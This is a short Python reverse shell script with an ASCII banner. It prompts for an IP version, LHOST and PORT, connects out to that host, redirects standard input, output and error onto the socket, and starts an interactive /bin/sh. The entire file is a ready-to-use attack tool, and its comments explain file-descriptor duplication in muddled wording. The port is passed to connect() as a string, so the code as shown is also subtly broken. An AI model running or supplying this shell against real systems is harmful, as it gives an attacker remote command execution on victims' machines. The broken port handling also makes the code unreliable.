#!/usr/bin/env python3

"""
 __                        __ _            ___                _____  
 / _|_ __ ___  _ __ ___    / _| | _____  __/ / |_ _   _ _ __  / _ \ \ 
| |_| '__/ _ \| '_ ` _ \  | |_| |/ _ \ \/ / || __| | | | '_ \| | | | |
|  _| | | (_) | | | | | | |  _| |  __/>  <| || |_| |_| | | | | |_| | |
|_| |_|  \___/|_| |_| |_| |_| |_|\___/_/\_\ | \__|\__,_|_| |_|\___/| |
                                           \_\                    /_/ 


"""


import socket
import subprocess
import os
from typing import*
from colorama.ansi import Fore
from colorama.initialise import wrapped_stdout


ınet =  (input(f'''[{Fore.RED}IPV4{Fore.BLUE}({Fore.WHITE}1{Fore.BLUE})/{Fore.YELLOW}IPV6{Fore.BLUE}({Fore.WHITE}2{Fore.BLUE}){Fore.WHITE}](defaulth:IP4): '''))
ınet_af=""
if ınet == "":
    ınet_af = socket.AF_INET
    '''ıpv (4) protocol'''
if ınet == str(1):
    ınet_af = socket.AF_INET
    '''ıpv (4) protocol'''
if ınet == str(2):
    ınet_af = socket.AF_INET6
    '''ıpv (6) protocol [AF_INET6]'''

lhost = input(f' {Fore.LIGHTWHITE_EX}LHOST:') 
port = input(f' {Fore.LIGHTWHITE_EX}PORT:') 
print(f"{Fore.LIGHTGREEN_EX}###################################")

print(f'''           
optons:
    {Fore.LIGHTWHITE_EX}IPV_Protocol{Fore.RED}: {Fore.WHITE}{ınet}
    {Fore.LIGHTWHITE_EX}LHOST{Fore.RED}: {Fore.WHITE}{lhost} 
    {Fore.LIGHTWHITE_EX}PORT{Fore.RED}: {Fore.WHITE}{port}
    
''')

s = socket.socket(ınet_af,socket.SOCK_STREAM)
s.connect((lhost,port))
#
###################################################
#fd: A file descriptor, which is to be duplicated. 
#fd2: This is duplicate value of file descriptor   
###################################################
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
#The dup2 function is similar to the dup function, 
#but the dup2 function allows the caller to specify a valid descriptor and 
#the id of the target descriptor. When the dup2 function returns successfully,
#the target descriptor (the second parameter of the dup2 function) will become the source descriptor
#(the dup2 function
#The first parameter), in other words, both file descriptors now point to the same file and are the first in the function


p=subprocess.call(["/bin/sh","-i"])